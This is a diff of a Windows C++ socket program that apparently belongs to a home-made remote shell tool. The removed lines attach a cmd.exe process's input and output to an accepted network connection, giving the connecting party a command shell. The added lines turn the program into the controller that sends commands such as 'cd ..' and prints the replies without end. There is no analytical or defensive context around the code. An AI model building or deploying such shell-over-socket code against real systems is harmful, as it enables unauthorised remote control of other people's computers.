@@ -71,31 +71,16 @@ int main()
     cout << "Waiting for incoming connections..." << endl;
     SOCKET clientSocket = accept(listenSocket, nullptr, nullptr);
     
-    cout << "Client connected!" << endl;
+    cout << "\nClient connected!" << endl << "_______________________________________________________________\n";
     
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    // send_data(clientSocket," Gib Shell pls UwU ");
-    // cout << "got this -> " << receive_data(clientSocket) << endl;
-    SECURITY_ATTRIBUTES saAttr = {0};
-    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
-    saAttr.bInheritHandle = TRUE;
-
-    PROCESS_INFORMATION pi = {0};
-    STARTUPINFOW si = {0};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdOutput = si.hStdError = si.hStdInput = (HANDLE)clientSocket;
-
-    
-    wchar_t command[] = L"cmd.exe";
-    if(!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    send_data(clientSocket,"cd .."); cout<< "\n\n\n";
+    while(1)
     {
-        std::cerr << "CreateProcess failed.\n";
-        closesocket(clientSocket);
-        WSACleanup();
-        return 1;
+        cout << receive_data(clientSocket);
     }
+
 
 
     // cout << "got this -> " << receive_data(clientSocket) << endl;
